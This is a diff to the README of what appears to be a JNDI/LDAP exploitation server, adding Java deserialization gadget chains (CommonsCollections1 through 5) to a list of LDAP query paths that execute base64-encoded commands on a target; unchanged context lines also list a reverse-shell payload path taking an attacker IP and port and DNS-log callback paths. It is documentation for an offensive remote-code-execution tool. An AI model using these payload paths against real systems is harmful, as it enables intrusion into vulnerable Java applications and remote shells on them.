@@ -64,6 +64,12 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1_1/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections2/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections4/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollections5/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections7/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
@@ -122,6 +128,12 @@ Supported LADP Queries：
   * ```URLDNS```
   * ```CommonsBeanutils1```  
   * ```CommonsBeanutils2```
+  * ```CommonsCollections1```
+  * ```CommonsCollections1_1```
+  * ```CommonsCollections2```
+  * ```CommonsCollections3```
+  * ```CommonsCollections4```
+  * ```CommonsCollections5```
   * ```CommonsCollections6```
   * ```CommonsCollections7```
   * ```CommonsCollectionsK1```
